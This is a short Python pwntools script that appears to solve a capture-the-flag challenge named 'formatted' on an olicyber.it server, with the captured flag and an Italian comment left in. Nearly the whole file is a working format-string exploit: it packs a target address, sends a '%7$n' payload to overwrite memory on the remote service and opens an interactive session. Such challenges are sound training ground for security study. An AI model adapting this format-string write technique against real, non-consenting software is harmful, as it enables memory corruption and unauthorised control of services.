#! /usr/bin/env python3
     
from pwn import process, remote
import struct
flag = struct.pack("I",0x40404c) + struct.pack("I",00)




print(flag)
# 782578257825782578257825
# conn = process('./formatted')
conn = remote('formatted.challs.olicyber.it',10305)
conn.recvline()
payload =b'111' +b'%7$n' +b"\x00" +  flag
print(payload)
with open('/tmp/prova.txt', 'wb') as f:
    f.write(payload)
print('sending', payload)
conn.sendline(payload)
print(conn.recvline())
conn.interactive()

# flag{So_y0U_kn0w_F0rm4t_StR1ng5}

# che fatica...